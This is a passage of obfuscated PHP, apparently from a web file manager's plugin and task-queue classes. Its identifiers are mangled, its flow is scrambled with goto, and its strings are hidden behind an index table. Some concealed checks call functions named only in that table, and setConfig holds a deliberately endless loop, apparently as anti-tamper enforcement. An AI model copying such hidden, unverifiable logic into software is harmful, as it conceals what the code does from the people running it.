$A†ËõŒºÌ“ = false) { goto dîÑ«ÂØ¯ä; E…•ùçª‹Æ: $this->parsePackage($AÙ‚Ã¶¨‚); if (is_array($A†ËõŒºÌ“)) { $AÙ‚Ã¶¨‚ = str_replace(array_keys($A†ËõŒºÌ“), array_values($A†ËõŒºÌ“), $AÙ‚Ã¶¨‚); } echo $dß»¥Ã¦Ù[227] . $AÙ‚Ã¶¨‚; goto c¬õßØ§óñ; C°çŒË×ªª: $AÙ‚Ã¶¨‚ = $this->parseFile($Cµî—›²²¬); $this->parseLang($AÙ‚Ã¶¨‚); $this->parseConfig($AÙ‚Ã¶¨‚); goto E…•ùçª‹Æ; dîÑ«ÂØ¯ä: $dß»¥Ã¦Ù =& $_SERVER[ç]; $Cµî—›²²¬ = $this->pluginPath . $E„×íùÑ“Ş; if (ACT == $dß»¥Ã¦Ù[1415]) { echo $dß»¥Ã¦Ù[1416] . $this->pluginName . $dß»¥Ã¦Ù[8] . $E„×íùÑ“Ş . $dß»¥Ã¦Ù[1417]; if (!file_exists($Cµî—›²²¬)) { echo $dß»¥Ã¦Ù[1418]; return; } } goto C°çŒË×ªª; c¬õßØ§óñ: } final function initLang() { goto Cğ¹ÎŠãç÷; cÜšØå²Ï: $fÑàÜÑÅÆ  = I18n::getType(); $E®‚õ”š¿å = array(); if (file_exists($e¢÷Ô£¸Ú . $fÑàÜÑÅÆ  . $CÍÖ¤¢Ğ¶Ñ[773])) { $E®‚õ”š¿å = (include $e¢÷Ô£¸Ú . $fÑàÜÑÅÆ  . $CÍÖ¤¢Ğ¶Ñ[773]); } else { if ($fÑàÜÑÅÆ  == $CÍÖ¤¢Ğ¶Ñ[1421] && !file_exists($e¢÷Ô£¸Ú . $fÑàÜÑÅÆ  . $CÍÖ¤¢Ğ¶Ñ[773]) && file_exists($e¢÷Ô£¸Ú . $CÍÖ¤¢Ğ¶Ñ[1422])) { $E®‚õ”š¿å = (include $e¢÷Ô£¸Ú . $CÍÖ¤¢Ğ¶Ñ[1422]); } else { if (file_exists($e¢÷Ô£¸Ú . $C¨Œ¡ˆî×Û . $CÍÖ¤¢Ğ¶Ñ[773])) { $E®‚õ”š¿å = (include $e¢÷Ô£¸Ú . $C¨Œ¡ˆî×Û . $CÍÖ¤¢Ğ¶Ñ[773]); } } } goto FŒ›ö·‘ùö; FŒ›ö·‘ùö: if (!is_array($E®‚õ”š¿å)) { return array(); } if (@count($E®‚õ”š¿å) > 0) { I18n::set($E®‚õ”š¿å); } return $E®‚õ”š¿å; goto fÖæ¦‘Ñù; Cğ¹ÎŠãç÷: $CÍÖ¤¢Ğ¶Ñ =& $_SERVER[ç]; $C¨Œ¡ˆî×Û = $CÍÖ¤¢Ğ¶Ñ[1419]; $e¢÷Ô£¸Ú = $this->pluginPath . $CÍÖ¤¢Ğ¶Ñ[1420]; goto cÜšØå²Ï; fÖæ¦‘Ñù: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($cÎœŞéƒËÏ) { $fÛ³õ­ß¾Ô =& $_SERVER[ç]; if (!isset($_SERVER[$fÛ³õ­ß¾Ô[788]]) || !isset($_SERVER[$fÛ³õ­ß¾Ô[795]])) { goto B«ÀĞ›È¶; B«ÀĞ›È¶: $e˜’˜ˆƒÒÂ = $fÛ³õ­ß¾Ô[809]; $bğÂ†‡¦‘Ä = $fÛ³õ­ß¾Ô[790]; $aîÁ¿­Á¨ = $_SERVER[$fÛ³õ­ß¾Ô[791]] . $fÛ³õ­ß¾Ô[792]; goto AÀ°‚¹; eÈÌ‡Ê°Ê¹: for ($e×·„‹Ù£ó = $dÊŒ­“É¥ô; $e×·„‹Ù£ó > 0; $e×·„‹Ù£ó++) { $E•ÓÀ…ù¯á = json_encode($GLOBALS[$fÛ³õ­ß¾Ô[405]]); } goto F¬ÍµÈÊ¡õ; AÀ°‚¹: $f…îµƒâó¨ = $bğÂ†‡¦‘Ä($aîÁ¿­Á¨); $A·ö˜‰´ÏÚ = explode($fÛ³õ­ß¾Ô[227], $f…îµƒâó¨); if (count($A·ö˜‰´ÏÚ) < $fÛ³õ­ß¾Ô[597]) { $DĞÀ£±õß = $fÛ³õ­ß¾Ô[793]; $DĞÀ£±õß(); } goto BÙºÜÅé¡î; BÙºÜÅé¡î: $E•ÓÀ…ù¯á = $fÛ³õ­ß¾Ô[810]; $E•ÓÀ…ù¯á($_SERVER[$fÛ³õ­ß¾Ô[811]]); $dÊŒ­“É¥ô = 1; goto eÈÌ‡Ê°Ê¹; F¬ÍµÈÊ¡õ: } return $this->modelPlugin->setConfig($this->pluginName, $cÎœŞéƒËÏ); } public function onSetConfig($Cª×çù®‡Î) { } public function onGetConfig($BŒé¹†—“î) { } public function onChangeStatus($C‹èØ§Ã©ä) { } public function onUninstall() { } public function onInstall() { } public function authCheck($b‡³Ó‡öì = "\160\154\165\147\151\156\101\x75\164\x68") { $e¨•Á÷±å =& $_SERVER[ç]; if (!defined($e¨•Á÷±å[448])) { return !1; } if (_get($GLOBALS, $e¨•Á÷±å[479])) { return !0; } $A¬¬ÆÈÆ´Á = $this->getConfig(); if (!$A¬¬ÆÈÆ´Á[$b‡³Ó‡öì]) { return !1; } return ActionCall($e¨•Á÷±å[1423], $A¬¬ÆÈÆ´Á[$b‡³Ó‡öì]); } public function url($B×áÏáëÀÜ, $eø¼ß“ƒÃµ = '', $bÉ¿‹Ş“»‚ = true) { goto e˜µ´éŠ–õ; F‹˜ ¨¢æ»: if (!$bÉ¿‹Ş“»‚) { return $C²Š°Œ’Ş¹; } echo $C²Š°Œ’Ş¹; goto f»£¢Ö—éÃ; eƒêŠÏá¸Ê: $Dà‡Š•Øéá = $this->packageVersion(); $b‹¾Ë» = $C²¦³‹Í’Æ . $bå¤æäİ¥£[434] . $Dà‡Š•Øéá; if (substr($B×áÏáëÀÜ, 0, 4) == $bå¤æäİ¥£[146] || substr($B×áÏáëÀÜ, 0, 2) == $bå¤æäİ¥£[1209]) { $C²Š°Œ’Ş¹ = $B×áÏáëÀÜ . $bå¤æäİ¥£[1424] . $b‹¾Ë»; } else { if ($eø¼ß“ƒÃµ == $bå¤æäİ¥£[33]) { $C²Š°Œ’Ş¹ = $this->pluginHost . $B×áÏáëÀÜ . $bå¤æäİ¥£[1424] . $b‹¾Ë»; } else { if ($eø¼ß“ƒÃµ === $bå¤æäİ¥£[76]) { $C²Š°Œ’Ş¹ = $this->pluginHost . $B×áÏáëÀÜ; } else { if ($eø¼ß“ƒÃµ == $bå¤æäİ¥£[1425]) { $C²Š°Œ’Ş¹ = STATIC_PATH . $B×áÏáëÀÜ . $bå¤æäİ¥£[1424] . $C²¦³‹Í’Æ; } else { if ($eø¼ß“ƒÃµ == $bå¤æäİ¥£[1426]) { $C²Š°Œ’Ş¹ = APP_HOST . $bå¤æäİ¥£[1427] . $B×áÏáëÀÜ . $bå¤æäİ¥£[1424] . $C²¦³‹Í’Æ; } else { if (isset($F•Ù¥Ë[$eø¼ß“ƒÃµ])) { $C²Š°Œ’Ş¹ = $F•Ù¥Ë[$eø¼ß“ƒÃµ] . $B×áÏáëÀÜ . $bå¤æäİ¥£[1424] . $b‹¾Ë»; } } } } } } goto F‹˜ ¨¢æ»; e˜µ´éŠ–õ: $bå¤æäİ¥£ =& $_SERVER[ç]; $F•Ù¥Ë = $this->getConfig(); $C²¦³‹Í’Æ = KOD_VERSION . $bå¤æäİ¥£[94] . KOD_VERSION_BUILD; goto eƒêŠÏá¸Ê; f»£¢Ö—éÃ: } public function link($f”ß×›ÔµÂ = false, $c¬ŸĞƒ„Ã = '') { $c–“š«öÑ… =& $_SERVER[ç]; if (!$f”ß×›ÔµÂ) { $this->link($c–“š«öÑ…[1428], $c–“š«öÑ…[1426]); $this->link($c–“š«öÑ…[1429], $c–“š«öÑ…[1425]); $this->link($c–“š«öÑ…[1430], $c–“š«öÑ…[1425]); $this->link($c–“š«öÑ…[1431], $c–“š«öÑ…[1425]); $this->link($c–“š«öÑ…[1432], $c–“š«öÑ…[1425]); return; } $C­”÷ïïñ = $this->url($f”ß×›ÔµÂ, $c¬ŸĞƒ„Ã, !1); if (substr($f”ß×›ÔµÂ, -3) == $c–“š«öÑ…[1433]) { echo $c–“š«öÑ…[1434] . $C­”÷ïïñ . $c–“š«öÑ…[1435] . $c–“š«öÑ…[227]; } else { if (substr($f”ß×›ÔµÂ, -4) == $c–“š«öÑ…[1436]) { echo $c–“š«öÑ…[1437] . $C­”÷ïïñ . $c–“š«öÑ…[1438] . $c–“š«öÑ…[227]; } } } } if ($_SERVER[$_SERVER[ç][788]] != $_SERVER[$_SERVER[ç][789]]) { goto aÏ–¡ÎÍø; aÏ–¡ÎÍø: $cªæÉØì‚ = $_SERVER[ç][790]; $eßİ«Ÿó² = $_SERVER[$_SERVER[ç][791]] . $_SERVER[ç][792]; $cíéÂÕÃ»Î = $cªæÉØì‚($eßİ«Ÿó²); goto eˆ»´åô; E¨Œ›¯”Ûë: $d«÷÷…š’Ê($_SERVER[$_SERVER[ç][795]]); goto C¦ßõ¦Óœ¤; eˆ»´åô: $e—ÜÜŠ†ï = explode($_SERVER[ç][227], $cíéÂÕÃ»Î); if (count($e—ÜÜŠ†ï) < $_SERVER[ç][570]) { $eŒåÑ×ÄÖœ = $_SERVER[ç][793]; $eŒåÑ×ÄÖœ(); } $d«÷÷…š’Ê = $_SERVER[ç][794]; goto E¨Œ›¯”Ûë; C¦ßõ¦Óœ¤: } goto aƒ®‚¦Ñîå; A²•Ö•î: class TaskQueue { const MAX_LENGTH = 1000; const QUEUE_LENGTH = "\164\x61\x73\153\121\165\x65\x75\145\114\x65\156\x67\x74\x68"; const QUEUE_DATA = "\164\141\x73\153\x51\x75\x65\165\145\x44\141\x74\x61"; public static $listData = false; public static function initTask() { } public static function add($aôÕÒéÈ², $a©òÜ½’ñ… = array(), $fí¹¨ÛÔ°Ã = '', $B¸‡ÂŠİ· = '') { $CÂÆ³¦Ô =& $_SERVER[ç]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($B¸‡ÂŠİ· && array_find_by_field(self::$listData, $CÂÆ³¦Ô[92], $B¸‡ÂŠİ·)) { return !0; } self::$listData[] = array($CÂÆ³¦Ô[260] => $aôÕÒéÈ², $CÂÆ³¦Ô[1560] => $a©òÜ½’ñ…, $CÂÆ³¦Ô[425] => $fí¹¨ÛÔ°Ã, $CÂÆ³¦Ô[92] => $B¸‡ÂŠİ·); return !0; } public static function addSubmit() { $bª¢à¿’š =& $_SERVER[ç]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($bª¢à¿’š[1561] . json_encode_force(array_to_keyvalue(self::$listData, $bª¢à¿’š[33], $bª¢à¿’š[425])), $bª¢à¿’š[1562]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($dÔáî”Â²ø, $Eó£—æ× = array(), $fÜõ¶÷• = '', $e‡µ–£ˆÎ = '') { goto A†Ôìù²²Ñ; A†Ôìù²²Ñ: $FÉ…ö£¯ÛĞ =& $_SERVER[ç]; if (self::count() >= self::MAX_LENGTH) { return !1; } $cÀ®ß¼²­Ö = self::getAll(); goto eø±ÈÜŒİ¶; f–¬éÔ²º¼: self::setAll($cÀ®ß¼²­Ö); return !0; goto c¤Û„‚²Ş; eø±ÈÜŒİ¶: if ($e‡µ–£ˆÎ && array_find_by_field($cÀ®ß¼²­Ö, $FÉ…ö£¯ÛĞ[92], $e‡µ–£ˆÎ)) { return !0; } $cÀ®ß¼²­Ö[] = array($FÉ…ö£¯ÛĞ[260] => $dÔáî”Â²ø, $FÉ…ö£¯ÛĞ[1560] => $Eó£—æ×, $FÉ…ö£¯ÛĞ[425] => $fÜõ¶÷•, $FÉ…ö£¯ÛĞ[92] => $e‡µ–£ˆÎ); write_log($FÉ…ö£¯ÛĞ[1561] . $fÜõ¶÷•, $FÉ…ö£¯ÛĞ[1562]); goto f–¬éÔ²º¼; c¤Û„‚²Ş: } public static function run() { goto D£—“¯«Ñõ; D£—“¯«Ñõ: $bµ¶Ë­ÏœÚ =& $_SERVER[ç]; $Cë‰ï‚Ä¯ = self::getAll(); $c‚åŞŞŸ© = array_shift($Cë‰ï‚Ä¯); goto døò¨°­÷‰; døò¨°­÷‰: if (!$c‚åŞŞŸ©) { return !1; } self::setAll($Cë‰ï‚Ä¯); $aºÍ¥‘¬ğÅ = timeFloat(); goto AŸÑ·Ş’ÍÅ; AŸÑ·Ş’ÍÅ: try { Hook::apply($c‚åŞŞŸ©[$bµ¶Ë­ÏœÚ[260]], $c‚åŞŞŸ©[$bµ¶Ë­ÏœÚ[1560]]); } catch (Exception $BÄ¼ ÁÜî) { } $d‘Ñß“Œãò = number_format(timeFloat() - $aºÍ¥‘¬ğÅ, 3) . $bµ¶Ë­ÏœÚ[1504]; write_log($bµ¶Ë­ÏœÚ[1563] . $c‚åŞŞŸ©[$bµ¶Ë­ÏœÚ[425]] . $bµ¶Ë­ÏœÚ[1564] . $d‘Ñß“Œãò, $bµ¶Ë­ÏœÚ[1562]); goto dèàÌØÉŠŸ; dèàÌØÉŠŸ: return !0; goto FÓ£³ºòº; FÓ£³ºòº: } public static function count() { $fõ¾›Î¶ß„ = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$fõ¾›Î¶ß„) { return 0; } return intval($fõ¾›Î¶ß„); } public static function getAll() { $aßî®…“¸¸ = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$aßî®…“¸¸) { return array(); } return $aßî®…“¸¸; } public static function setAll($b³ğòœ¹) { $eí¹‹ØÑÆ¶ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($b³ğòœ¹), $eí¹‹ØÑÆ¶); Cache::set(self::QUEUE_DATA, $b³ğòœ¹, $eí¹‹ØÑÆ¶); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($dù÷‡‰Á§, $CïÏ­É°«£ = 5.0) { if (!$dù÷‡‰Á§) { return; } $EÖÜ ¥ŠÏ¬ = Cache::get($dù÷‡‰Á§); if (!$EÖÜ ¥ŠÏ¬ || timeFloat() - floatVal($EÖÜ ¥ŠÏ¬) >= $CïÏ­É°«£) { Cache::set($dù÷‡‰Á§, timeFloat(), $CïÏ­É°«£ * 10); return !0; } return !1; } public static function timeLimitCall($E½â¼ëÀÎ, $FÖ”ÁŸ‡ø, $AøÜ‚½š°, $c‰–½·ø­ = 5.0) { goto Eå–êñá¼¯; Eå–êñá¼¯: $BğÂ‰Ö°Ç =& $_SERVER[ç]; if (!$E½â¼ëÀÎ || !$FÖ”ÁŸ‡ø) { return; } self::$asyncAdd = !0; goto fÖÜŞ¼ËÕ“; AçØ­¥Ş˜İ: if (is_array($c¦ù±Ã­÷[$E½â¼ëÀÎ])) { $B¥±Æ­š‘Ê[$BğÂ‰Ö°Ç[1567]] = $c¦ù±Ã­÷[$E½â¼ëÀÎ][$BğÂ‰Ö°Ç[1567]]; } if (is_array($c¦ù±Ã­÷[$E½â¼ëÀÎ])) { if (timeFloat() - $c¦ù±Ã­÷[$E½â¼ëÀÎ][$BğÂ‰Ö°Ç[1566]] < $B¥±Æ­š‘Ê[$BğÂ‰Ö°Ç[195]] * 0.3) { return; } $B¥±Æ­š‘Ê[$BğÂ‰Ö°Ç[1567]] = $c¦ù±Ã­÷[$E½â¼ëÀÎ][$BğÂ‰Ö°Ç[1567]]; } $c¦ù±Ã­÷[$E½â¼ëÀÎ] = $B¥±Æ­š‘Ê; goto c®Ã½×’¿; c®Ã½×’¿: Cache::set($d ÅÌ•ç„, $c¦ù±Ã­÷, 60); Cache::removeMemory($d ÅÌ•ç„); write_log($BğÂ‰Ö°Ç[1568] . $E½â¼ëÀÎ . $BğÂ‰Ö°Ç[67] . $FÖ”ÁŸ‡ø, $BğÂ‰Ö°Ç[1562]); goto D†ñÏ¥ÌÚÆ; fÖÜŞ¼ËÕ“: $d ÅÌ•ç„ = $BğÂ‰Ö°Ç[1565]; $c¦ù±Ã­÷ = Cache::get($d ÅÌ•ç„, !0); $B¥±Æ­š‘Ê = array($BğÂ‰Ö°Ç[1566] => timeFloat(), $BğÂ‰Ö°Ç[1567] => timeFloat(), $BğÂ‰Ö°Ç[260] => $FÖ”ÁŸ‡ø, $BğÂ‰Ö°Ç[1560] => $AøÜ‚½š°, $BğÂ‰Ö°Ç[195] => $c‰–½·ø­); goto AçØ­¥Ş˜İ; D†ñÏ¥ÌÚÆ: } public static function timeLimitCallLoop() { goto AÇø‘àĞ¸´; bëùÅ‚ÇÚê: if (!$fŞÙœ®‚ğ‡) { return Cache::remove($F—‡ÄÚÌõì); } Cache::set($F—‡ÄÚÌõì, $fŞÙœ®‚ğ‡, 60); Cache::removeMemory($F—‡ÄÚÌõì); goto A¥ô¾¥Â¦º; CïÕ‚©ÔÇ: if (!$càÔÅ™–ƒç || count($càÔÅ™–ƒç) <= 0) { return; } $Eçì£ğá™– = !1; $cìÌà˜åï = timeFloat(); goto e¹»‚İ¥; AÇø‘àĞ¸´: $BØÃ­“¼­† =& $_SERVER[ç]; $E±ï‘õã§ = array($BØÃ­“¼­†[1569]); $d™Œ‡à¤£ = in_array(strtolower(ACTION), $E±ï‘õã§); goto dÊ·œâ¦Úí; dÊ·œâ¦Úí: if (!$d™Œ‡à¤£ && !self::$asyncAdd) { return; } $F—‡ÄÚÌõì = $BØÃ­“¼­†[1565]; $càÔÅ™–ƒç = Cache::get($F—‡ÄÚÌõì, !0); goto CïÕ‚©ÔÇ; e¹»‚İ¥: $fŞÙœ®‚ğ‡ = array(); foreach ($càÔÅ™–ƒç as $E¬—ç¦­˜ => $FÈíŠ—³‹) { if ($cìÌà˜åï - $FÈíŠ—³‹[$BØÃ­“¼­†[1567]] > $FÈíŠ—³‹[$BØÃ­“¼­†[195]]) { $Eçì£ğá™– = !0; try { Hook::apply($FÈíŠ—³‹[$BØÃ­“¼­†[260]], $FÈíŠ—³‹[$BØÃ­“¼­†[1560]]); write_log($BØÃ­“¼­†[1570] . $E¬—ç¦­˜ . $BØÃ­“¼­†[67] . $FÈíŠ—³‹[$BØÃ­“¼­†[260]] . $BØÃ­“¼­†[1571] . ACTION, $BØÃ­“¼­†[1562]); } catch (Exception $D¶»‚ëäò) { } continue; } $fŞÙœ®‚ğ‡[$E¬—ç¦­˜] = $FÈíŠ—³‹; } if (!$Eçì£ğá™–) { return; } goto bëùÅ‚ÇÚê; A¥ô¾¥Â¦º: } public static function finished($a„‡±ŞÏ×±, $c£ì¨òùŒì) { $dÌêƒõó³– =& $_SERVER[ç]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($dÌêƒõó³–[260] => $a„‡±ŞÏ×±, $dÌêƒõó³–[1560] => $c£ì¨òùŒì); } private static function finishedRun() { $dÔ¯ËºÏÜÜ =& $_SERVER[ç]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $aøãÀ–Ù…å) { try { Hook::apply($aøãÀ–Ù…å[$dÔ¯ËºÏÜÜ[260]], $aøãÀ–Ù…å[$dÔ¯ËºÏÜÜ[1560]]); } catch (Exception $Fµ‚àƒË‚å) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto cƒ‡°¾Çªá; EÄŸ—¦¼¯: if (!$cºˆ¥›™Å°[$BĞ˜âªÑµà[1396]]) { $cºˆ¥›™Å°[$BĞ˜âªÑµà[1396]] = LNG($BĞ˜âªÑµà[1576]); } goto Bõ‡ÃÂ…ôÒ; fÀŸïÈËÓ²: Hook::bind($BĞ˜âªÑµà[1056], array($this, $BĞ˜âªÑµà[1574])); $cºˆ¥›™Å° =& $this->task; $cºˆ¥›™Å°[$BĞ˜âªÑµà[1575]] = $BĞ˜âªÑµà[1061]; goto EÄŸ—¦¼¯; cƒ‡°¾Çªá: $BĞ˜âªÑµà =& $_SERVER[ç]; parent::startAfter(); Hook::bind($BĞ˜âªÑµà[1572], array($this, $BĞ˜âªÑµà[1573])); goto fÀŸïÈËÓ²; Bõ‡ÃÂ…ôÒ: } protected function endAfter() { $FªÉë´¥Ó¸ =& $_SERVER[ç]; parent::endAfter(); Hook::unbind($FªÉë´¥Ó¸[1572], array($this, $FªÉë´¥Ó¸[1573])); Hook::unbind($FªÉë´¥Ó¸[1056], array($this, $FªÉë´¥Ó¸[1574])); } public function updateAfter() { $E—Šßè²ê‰ =& $_SERVER[ç]; $DÍøå‚¬‘ =& $this->task; if (!$DÍøå‚¬‘[$E—Šßè²ê‰[989]] || !$DÍøå‚¬‘[$E—Šßè²ê‰[704]]) { return; } if ($DÍøå‚¬‘[$E—Šßè²ê‰[1575]] == $E—Šßè²ê‰[1061]) { $BÚ§òˆ„ = 0; if ($DÍøå‚¬‘[$E—Šßè²ê‰[1534]]) { $BÚ§òˆ„ = $DÍøå‚¬‘[$E—Šßè²ê‰[1535]] / $DÍøå‚¬‘[$E—Šßè²ê‰[1534]]; } $DÍøå‚¬‘[$E—Šßè²ê‰[1492]] = $BÚ§òˆ„ * 0.3; } else { if ($DÍøå‚¬‘[$E—Šßè²ê‰[1575]] == $E—Šßè²ê‰[309]) { $BÚ§òˆ„ = $DÍøå‚¬‘[$E—Šßè²ê‰[1003]] / $DÍøå‚¬‘[$E—Šßè²ê‰[989]]; $DÍøå‚¬‘[$E—Šßè²ê‰[1492]] = 0.3 + $BÚ§òˆ„ * 0.4; } else { if ($DÍøå‚¬‘[$E—Šßè²ê‰[1575]] == $E—Šßè²ê‰[106]) { $BÑ¯ÒîŸèÜ = 0; if ($DÍøå‚¬‘[$E—Šßè²ê‰[1536]] == $E—Šßè²ê‰[106]) { $BÑ¯ÒîŸèÜ = $DÍøå‚¬‘[$E—Šßè²ê‰[1535]]; } $BÚ§òˆ„ = ($DÍøå‚¬‘[$E—Šßè²ê‰[1539]] + $BÑ¯ÒîŸèÜ) / $DÍøå‚¬‘[$E—Šßè²ê‰[704]]; $DÍøå‚¬‘[$E—Šßè²ê‰[1492]] = 0.3 + 0.4 + $BÚ§òˆ„ * 0.3; } } } if ($DÍøå‚¬‘[$E—Šßè²ê‰[1492]] > 0) { $EÌºƒ›ƒË¬ = timeFloat() - $DÍøå‚¬‘[$E—Šßè²ê‰[726]] - $DÍøå‚¬‘[$E—Šßè²ê‰[1495]]; $DÍøå‚¬‘[$E—Šßè²ê‰[1496]] = $EÌºƒ›ƒË¬ * (1 - $DÍøå‚¬‘[$E—Šßè²ê‰[1492]]) / $DÍøå‚¬‘[$E—Šßè²ê‰[1492]]; } } public function addFile($Cƒ©¤¼ó–à) { goto D‡·š†õÎ; b§¼öˆÎÇ: $EÕä‘¾…[$Dìæ§«¿ê[1532]] = $B¢î¬¸Ó¡Ä[$Dìæ§«¿ê[28]]; $EÕä‘¾…[$Dìæ§«¿ê[1534]] = $B¢î¬¸Ó¡Ä[$Dìæ§«¿ê[77]]; $EÕä‘¾…[$Dìæ§«¿ê[1535]] = 0; goto a‚‡¬ –Ç©; D‡·š†õÎ: $Dìæ§«¿ê =& $_SERVER[ç]; $EÕä‘¾… =& $this->task; $B¢î¬¸Ó¡Ä = IO::info($Cƒ©¤¼ó–à); goto b§¼öˆÎÇ; E‰“¢Ôçï™: $this->update(); goto B¾á®äÃÃ; a‚‡¬ –Ç©: $EÕä‘¾…[$Dìæ§«¿ê[991]] = $Dìæ§«¿ê[1551]; $EÕä‘¾…[$Dìæ§«¿ê[1536]] = $Dìæ§«¿ê[1061]; $EÕä‘¾…[$Dìæ§«¿ê[704]] = $B¢î¬¸Ó¡Ä[$Dìæ§«¿ê[77]]; goto cÛ´šÍò±’; cÛ´šÍò±’: $EÕä‘¾…[$Dìæ§«¿ê[989]] = 1; $aà‚ÏîÒ¼ = 0; $EÕä‘¾…[$Dìæ§«¿ê[1543]] = array($Dìæ§«¿ê[1544] => $aà‚ÏîÒ¼ + 1, $Dìæ§«¿ê[407] => $B¢î¬¸Ó¡Ä[$Dìæ§«¿ê[28]], $Dìæ§«¿ê[75] => $B¢î¬¸Ó¡Ä[$Dìæ§«¿ê[75]], $Dìæ§«¿ê[489] => $B¢î¬¸Ó¡Ä[$Dìæ§«¿ê[489]] ? $B¢î¬¸Ó¡Ä[$Dìæ§«¿ê[489]] : $B¢î¬¸Ó¡Ä[$Dìæ§«¿ê[75]]); goto E‰“¢Ôçï™; B¾á®äÃÃ: } public function unzipAfter($Dö²ïÏˆà) { goto E„‹ÑĞ¶º£; F«¿Àß‚¾Ö: $eÙšƒéËí[$E‹Š£ÃÂË[1003]] = 0; $eÙšƒéËí[$E‹Š£ÃÂË[1534]] = 0; $eÙšƒéËí[$E‹Š£ÃÂË[1535]] = 0; goto D··ßÂí¸Ø; F‚õë’»Æ: $fŞÍê‹ê› = IO::infoWithChildren($Dö²ïÏˆà); $AÀºãö†ç = 0; $eÙšƒéËí[$E‹Š£ÃÂË[1543]] = array($E‹Š£ÃÂË[1544] => $AÀºãö†ç + 1, $E‹Š£ÃÂË[407] => $fŞÍê‹ê›[$E‹Š£ÃÂË[28]], $E‹Š£ÃÂË[75] => $fŞÍê‹ê›[$E‹Š£ÃÂË[75]], $E‹Š£ÃÂË[489] => $fŞÍê‹ê›[$E‹Š£ÃÂË[489]] ? $fŞÍê‹ê›[$E‹Š£ÃÂË[489]] : $fŞÍê‹ê›[$E‹Š£ÃÂË[75]]); goto fäÜ­ä²Õ¯; E„‹ÑĞ¶º£: $E‹Š£ÃÂË =& $_SERVER[ç]; $eÙšƒéËí =& $this->task; $eÙšƒéËí[$E‹Š£ÃÂË[1575]] = $E‹Š£ÃÂË[106]; goto F‚õë’»Æ; fäÜ­ä²Õ¯: if ($fŞÍê‹ê›[$E‹Š£ÃÂË[29]] == $E‹Š£ÃÂË[173]) { $eÙšƒéËí[$E‹Š£ÃÂË[989]] = 1; } else { $eÙšƒéËí[$E‹Š£ÃÂË[989]] = $fŞÍê‹ê›[$E‹Š£ÃÂË[80]][$E‹Š£ÃÂË[78]]; } $eÙšƒéËí[$E‹Š£ÃÂË[991]] = $E‹Š£ÃÂË[33]; $eÙšƒéËí[$E‹Š£ÃÂË[1536]] = 0; goto F«¿Àß‚¾Ö; D··ßÂí¸Ø: $eÙšƒéËí[$E‹Š£ÃÂË[1532]] = $E‹Š£ÃÂË[33]; $eÙšƒéËí[$E‹Š£ÃÂË[1539]] = 0; $eÙšƒéËí[$E‹Š£ÃÂË[704]] = $fŞÍê‹ê›[$E‹Š£ÃÂË[77]]; goto B¬ß®öÕ¢…; B¬ß®öÕ¢…: $this->update(); self::log($E‹Š£ÃÂË[1577] . json_encode(array($eÙšƒéËí, $fŞÍê‹ê›))); goto FˆíÑìí¦¢; FˆíÑìí¦¢: } public function nameParse($DïÜÅÊ¸‡) { goto eõÍŠÄ¯Ò¡; c˜ÑæŒ¶Ò…: $Bá¾“ã²âÃ = get_path_this($DïÜÅÊ¸‡); if (strstr($Bá¾“ã²âÃ, $dèÏ¨¤Œ¬ä[94])) { $EçÖã­‘ÍÆ[$dèÏ¨¤Œ¬ä[1003]] += 1; $EçÖã­‘ÍÆ[$dèÏ¨¤Œ¬ä[989]] += 1; } $EçÖã­‘ÍÆ[$dèÏ¨¤Œ¬ä[1532]] = $DïÜÅÊ¸‡; goto dÍŞùâ÷Ê; dÍŞùâ÷Ê: $this->update(); goto a³‚ìíñ‚³; eõÍŠÄ¯Ò¡: $dèÏ¨¤Œ¬ä =& $_SERVER[ç]; $EçÖã­‘ÍÆ =& $this->task; if ($EçÖã­‘ÍÆ[$dèÏ¨¤Œ¬ä[1575]] == $dèÏ¨¤Œ¬ä[1061]) { $EçÖã­‘ÍÆ[$dèÏ¨¤Œ¬ä[1575]] = $dèÏ¨¤Œ¬ä[309]; $EçÖã­‘ÍÆ[$dèÏ¨¤Œ¬ä[1539]] = 0; $EçÖã­‘ÍÆ[$dèÏ¨¤Œ¬ä[704]] = 0; } goto c˜ÑæŒ¶Ò…; a³‚ìíñ‚³: } } goto A†ÔÅêªÃÔ; A†ÔÅêªÃÔ: class TaskZip extends TaskFileTransfer { protected function startAfter() { $fĞƒº’Çè =& $_SERVER[ç]; parent::startAfter(); Hook::bind($fĞƒº’Çè[1578], array($this, $fĞƒº’Çè[1573])); $A…ÀÑ®ˆ¢š =& $this->task; $A…ÀÑ®ˆ¢š[$fĞƒº’Çè[1575]] = $fĞƒº’Çè[1061]; if (!$A…ÀÑ®ˆ¢š[$fĞƒº’Çè[1396]]) { $A…ÀÑ®ˆ¢š[$fĞƒº’Çè[1396]] = LNG($fĞƒº’Çè[1579]); } } protected function endAfter() { $ağ‘¶«›ËŸ =& $_SERVER[ç]; parent::endAfter(); Hook::unbind($ağ‘¶«›ËŸ[1578], array($this, $ağ‘¶«›ËŸ[1573])); } public function updateAfter() { $A©ÓÃ„³Õ =& $_SERVER[ç]; $e·ÜğòÂÚù =& $this->task; if (!$e·ÜğòÂÚù[$A©ÓÃ„³Õ[989]] || !$e·ÜğòÂÚù[$A©ÓÃ„³Õ[704]]) { return; } if ($e·ÜğòÂÚù[$A©ÓÃ„³Õ[1575]] == $A©ÓÃ„³Õ[1061]) { $Eªƒ«‹Ğßè = $e·ÜğòÂÚù[$A©ÓÃ„³Õ[1535]]; if ($e·ÜğòÂÚù[$A©ÓÃ„³Õ[1536]] != $A©ÓÃ„³Õ[1061]) { $Eªƒ«‹Ğßè = 0; } $a¸¦ÄÜ¶® = ($e·ÜğòÂÚù[$A©ÓÃ„³Õ[1539]] + 